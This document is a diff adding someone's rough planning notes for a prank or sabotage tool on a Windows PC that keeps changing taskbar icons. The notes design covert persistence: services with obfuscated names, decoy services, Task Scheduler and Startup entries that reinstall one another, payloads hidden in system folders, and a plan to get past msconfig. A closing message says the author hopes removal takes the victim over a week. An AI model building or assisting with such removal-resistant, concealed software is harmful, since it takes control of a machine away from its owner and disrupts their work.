@@ -1,0 +1,177 @@
++-www.youtube.com "IconFile=G:\Admin\Desktop\Icons\genshin1.ico" IconIndex=0
+
+C:\Program Files\Mozilla Firefox\firefox.exe
+
+
+
+https://www.tenforums.com/tutorials/91267-change-default-icon-users-files-windows-10-a.html
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\DefaultIcon
+
+C:\Windows\System32\imageres.dll,-123
+
+
+
+
+
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-itemproperty?view=powershell-7.3
+
+https://cloudconvert.com/jpg-converter
+
+
+
+
+
+
+
+2 folders, one with cmd to change icon and the folder with icons, have the icons duplicate to another folder that acts as front
+
+progressively gets worse by day
+
+
+
+https://strontic.github.io/xcyclopedia/library/attrib.exe-2106B2C77CBE84029359D36DBC6F6E02.html
+
+
+ran a update to filezilla, needed perms, than icons changed
+
+
+
+
+G:\Admin\Desktop\Icons\Test\1\exe.bat
+
+
+
+
+G:\Admin\Desktop\Icons\Test\2
+
+
+
+
+
+
+
+
+
+
+
+
+https://superuser.com/questions/499078/refresh-icon-cache-without-rebooting
+
+icons on taskbar refresh, delete Iconcache.db
+
+
+
+
+it works,
+
+have random files moving through file explorer
+
+
+
+https://superuser.com/questions/1240313/enable-disable-the-show-hidden-files-setting-from-the-command-line
+
+
+
+
+
+Structure:
+
+
+Iconchanger script kept in random folder
+
+
+2 services:
+
+1. powershell cmd to keep 2nd alive | Drops Iconchanger script into random system folder
+2. Checks to see if;
+
+
+
+A. Script is in Task Sceduler and Startup folder, if they arn't gets copied from random place from service A, does this by searching all system folder with specific name
+B. Copies photos no matter what into photos folder where iconchanger pulls from, have photos in hidden specific system folder, named 
+
+
+Iconchanger = regnahcnocI
+
+
+
+Task scheduler:
+
+runs iconchanger script
+
+Startup folder:
+
+runs iconchanger script
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Get-Service -Name T* ---------------------------------------------finds service
+sc.exe delete "YourServiceName" --------------------------- Deletes service
+
+
+
+Task scheduler runs bat file that copies nssm exe and sub files from randomly placed place, searches for the folder and then copies it
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Whole Idea:
+
+Powershell that changes icons on taskbar
+
+needs to run atleast once every reboot of computer 
+
+NSSM manager runs service that will check startup folder and easy to find task scheduler powershell icon changer script and reinput them in
+
+
+
+think about adding service that runs powershell script to
+check to see if disableing it in msconfig actualy stops it
+have task scheduler have more hidden task that copies nssm exe if deleted
+
+
+
+Service is main host:
+
+Main service is named to ofuscate and makes multiple services that purposly look fake
+
+Main service checks task scheduler and startup folder and reinputs if they are deleted
+
+
+
+Insert stuff in this folder C:\Windows\IME\IMEJP\Assets
+
+hide icons seperatly from scripts
+
+
+
+
+for another sabotage, add another hard drive and have admin give it power so it can run what ever it wants
+
+phonetic alphabet as Task schedule name (Have Fun) (Hotel Alpha Victor Echo Foxtrot Uniform November)
+
+I hope this takes you longer than a week cause Ive done nothing for the last month (India Hotel Oscar Papa Echo Tango Hotel India Sierra Tango Alpha Kilo Echo Sierra Yankee Oscar Uniform Lima Oscar November Golf Echo Romeo Tango Hotel Alpha November Alpha Whiskey Echo Echo Kilo Charlie Alpha Uniform Sierra Echo India Victor Echo Delta Oscar November Echo November Oscar Tango Hotel India November Golf Foxtrot Oscar Romeo Tango Hotel Echo Lima Alpha Sierra Tango Mike Oscar November Tango Hotel )
+
